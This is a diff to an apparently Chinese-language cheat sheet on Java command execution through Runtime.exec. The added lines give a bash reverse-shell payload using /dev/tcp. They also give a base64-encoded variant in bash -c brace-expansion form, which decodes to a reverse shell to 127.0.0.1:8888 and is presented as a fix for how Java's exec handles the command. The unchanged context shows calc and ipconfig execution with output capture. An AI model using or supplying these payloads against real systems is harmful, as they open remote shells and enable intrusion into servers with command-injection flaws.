@@ -5,6 +5,15 @@ java.lang.Runtime.getRuntime().exec("calc");
 Runtime runtime = Runtime.getRuntime();
 runtime.exec("calc");
 ```
+注意java这里反弹shell需要改良
+```
+Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");
+
+bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：
+
+bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
+```
+
 有回显命令执行
 ```
 java.io.InputStream in = Runtime.getRuntime().exec("ipconfig").getInputStream();
